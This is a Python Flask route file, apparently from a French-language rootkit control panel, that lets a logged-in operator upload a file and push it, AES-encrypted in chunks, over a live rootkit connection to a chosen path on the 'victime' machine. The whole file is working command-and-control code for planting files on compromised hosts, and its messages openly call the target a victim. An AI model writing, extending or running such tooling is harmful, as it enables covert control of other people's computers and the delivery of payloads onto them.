from flask import Blueprint, render_template, redirect, request, flash, url_for
from werkzeug.utils import secure_filename
import utils.state as state
from utils.crypto import aes_encrypt
from utils.socket_comm import send_to_server
import os

upload_bp = Blueprint('upload', __name__)

@upload_bp.route('/', methods=['GET', 'POST'])
def upload():
    if not state.authenticated:
        return redirect(url_for('auth.login'))

    if request.method == 'POST':
        uploaded_file = request.files.get('file')
        remote_path = request.form.get('remote_path')

        if uploaded_file and remote_path:
            filename = secure_filename(uploaded_file.filename)
            local_path = os.path.join(state.app.config['UPLOAD_FOLDER'], filename)
            uploaded_file.save(local_path)

            try:
                upload_file_encrypted(local_path, remote_path)
                flash(f"✅ Fichier '{filename}' uploadé et transmis à la victime.")
            except Exception as e:
                flash(f"❌ Erreur lors du transfert à la victime : {e}")

    return render_template("upload.html")

def upload_file_encrypted(local_path, remote_path):
    if not os.path.exists(local_path):
        print(f"[!] Le fichier local '{local_path}' n'existe pas.")
        return

    try:
        send_to_server(state.rootkit_connection, f"upload {remote_path}")

        with open(local_path, "rb") as f:
            while True:
                chunk = f.read(4096)
                if not chunk:
                    break
                encrypted = aes_encrypt(chunk)
                state.rootkit_connection.sendall(encrypted)

        state.rootkit_connection.sendall(b"EOF\n")
        print(f"[+] Fichier '{local_path}' envoyé avec succès vers '{remote_path}'.")

    except Exception as e:
        print(f"[!] Erreur d'envoi : {e}")
